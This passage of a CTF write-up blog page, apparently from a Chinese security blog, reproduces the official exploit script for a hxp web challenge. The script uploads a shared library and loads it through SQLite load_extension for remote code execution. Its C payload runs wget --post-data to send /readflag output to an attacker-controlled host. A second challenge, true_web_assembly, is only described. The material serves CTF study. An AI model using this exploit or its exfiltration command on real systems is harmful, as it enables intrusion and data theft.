src=https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313110253988.png alt=image-20230313110253988></p><p>官方exp.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>threading</span> <span style=color:#f92672>import</span> <span style=color:#111>Thread</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>subprocess</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>http.server</span> <span style=color:#f92672>import</span> <span style=color:#111>HTTPServer</span><span style=color:#111>,</span> <span style=color:#111>BaseHTTPRequestHandler</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>socketserver</span> <span style=color:#f92672>import</span> <span style=color:#111>ThreadingMixIn</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>EXPLOIT</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;rce.csv&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>HOST</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;TODO&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#111>MY_HOST</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;TODO&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>MY_PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>send_rce</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[+] uploader started&#39;</span><span style=color:#111>,</span> <span style=color:#111>file</span><span style=color:#f92672>=</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>stderr</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#f92672>=</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;http://</span><span style=color:#d88200>{</span><span style=color:#111>HOST</span><span style=color:#d88200>}</span><span style=color:#d88200>:</span><span style=color:#d88200>{</span><span style=color:#111>PORT</span><span style=color:#d88200>}</span><span style=color:#d88200>/gz/import/&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#111>files</span><span style=color:#f92672>=</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>:</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>EXPLOIT</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;rb&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>})</span>
</span></span><span style=display:flex><span>        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>status_code</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;UPLOAD&#34;</span><span style=color:#111>,</span> <span style=color:#111>file</span><span style=color:#f92672>=</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>stderr</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>call_rce</span><span style=color:#111>(</span><span style=color:#111>fd</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[+] caller started&#39;</span><span style=color:#111>,</span> <span style=color:#111>file</span><span style=color:#f92672>=</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>stderr</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#f92672>=</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;http://</span><span style=color:#d88200>{</span><span style=color:#111>HOST</span><span style=color:#d88200>}</span><span style=color:#d88200>:</span><span style=color:#d88200>{</span><span style=color:#111>PORT</span><span style=color:#d88200>}</span><span style=color:#d88200>/gz/query&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#d88200>&#34;sql&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;&#34;&#34;select load_extension(&#34;/proc/self/fd/</span><span style=color:#d88200>{</span><span style=color:#111>fd</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;,&#34;flag&#34;)&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>})</span>
</span></span><span style=display:flex><span>        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>status_code</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;CALL&#34;</span><span style=color:#111>,</span> <span style=color:#111>file</span><span style=color:#f92672>=</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>stderr</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>compile_exploit</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;rce.c&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;w&#34;</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>#include &lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#d88200>#include &lt;unistd.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#d88200>#include &lt;stdlib.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>void flag() </span><span style=color:#8045ff>{{</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>    system(&#34;wget --post-data `/readflag` http://</span><span style=color:#d88200>{</span><span style=color:#111>MY_HOST</span><span style=color:#d88200>}</span><span style=color:#d88200>:</span><span style=color:#d88200>{</span><span style=color:#111>MY_PORT</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#d88200></span><span style=color:#8045ff>}}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>void space() </span><span style=color:#8045ff>{{</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>    static char waste[500 * 1024] = </span><span style=color:#8045ff>{{</span><span style=color:#d88200>2</span><span style=color:#8045ff>}}</span><span style=color:#d88200>;
</span></span></span><span style=display:flex><span><span style=color:#d88200></span><span style=color:#8045ff>}}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#34;&#34;&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>([</span><span style=color:#d88200>&#34;gcc&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;-shared&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;rce.c&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;-o&#34;</span><span style=color:#111>,</span> <span style=color:#111>EXPLOIT</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>returncode</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>exit</span><span style=color:#111>(</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>Handler</span><span style=color:#111>(</span><span style=color:#111>BaseHTTPRequestHandler</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>do_POST</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>content_len</span> <span style=color:#f92672>=</span> <span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>headers</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Content-Length&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>        <span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>rfile</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>(</span><span style=color:#111>content_len</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>flag</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>ThreadingSimpleServer</span><span style=color:#111>(</span><span style=color:#111>ThreadingMixIn</span><span style=color:#111>,</span> <span style=color:#111>HTTPServer</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>server</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[+] http server started&#39;</span><span style=color:#111>,</span> <span style=color:#111>file</span><span style=color:#f92672>=</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>stderr</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>server</span> <span style=color:#f92672>=</span> <span style=color:#111>ThreadingSimpleServer</span><span style=color:#111>((</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#111>MY_PORT</span><span style=color:#111>),</span> <span style=color:#111>Handler</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># we only need to handle one response</span>
</span></span><span style=display:flex><span>    <span style=color:#111>server</span><span style=color:#f92672>.</span><span style=color:#111>handle_request</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>server</span><span style=color:#f92672>.</span><span style=color:#111>shutdown</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>compile_exploit</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>server</span><span style=color:#111>,</span> <span style=color:#111>daemon</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>t1</span> <span style=color:#f92672>=</span> <span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>send_rce</span><span style=color:#111>,</span> <span style=color:#111>daemon</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>t1</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>7</span><span style=color:#111>,</span> <span style=color:#ae81ff>8</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>t2</span> <span style=color:#f92672>=</span> <span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>call_rce</span><span style=color:#111>,</span> <span style=color:#111>daemon</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>,))</span>
</span></span><span style=display:flex><span>        <span style=color:#111>t2</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>()</span>
</span></span></code></pre></div><p>最后的flag</p><p><code>hxp{load_extension(r3m0t3_c0d3_3x3cut10n)}</code></p><h2 id=webtrue_web_assembly>*web/true_web_assembly</h2><blockquote><p><a href=https://board.asm32.info/asmbb-v2-9-has-been-released.328/>https://board.asm32.info/asmbb-v2-9-has-been-released.328/</a></p><p>From the post:</p><ul><li>“AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”</li><li>“Download, install and hack”</li></ul><p>Yes</p><hr><p>Goal is to get the admin to visit a page on the forum,
HACK-HACK-HACK,
/readflag will print out the flag.</p><hr><p>Please don’t submit too many requests or try to abuse anything with the setup.</p><p>Focus on the forum’s implementation.</p><hr><p>Two dockerfiles are provided:</p><ul><li>./Dockerfile for hosting the challenge</li><li>standalone-build/Dockerfile for building asmbb engine for a specific commit</li></ul></blockquote><p>*压轴难题，还没有wp……先等各路大爹们发wp再复现（）</p></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fxxking life page">Fxxking life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><li class="px-1 md:px-0"><a href=https://www.travellings.cn/go.html title="Travelling page">Travelling</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=V2VkIDI3IEFwcmlsIDIwMjIgMTE6MzM6MTUgVVRD target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/7562434112 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 2218 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/relax/bass-practice-memo/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>bass练习备忘</a></div><div><div class="font-serif pb-2 flex align-start leading-loose"><span class="heading pr-6 leading-loose">Related</span>
<span><a href=/2023/01/05/javascript-reverse-study-notes-02/>Javascript逆向学习笔记Ⅱ</a>&nbsp;&nbsp;/&nbsp;
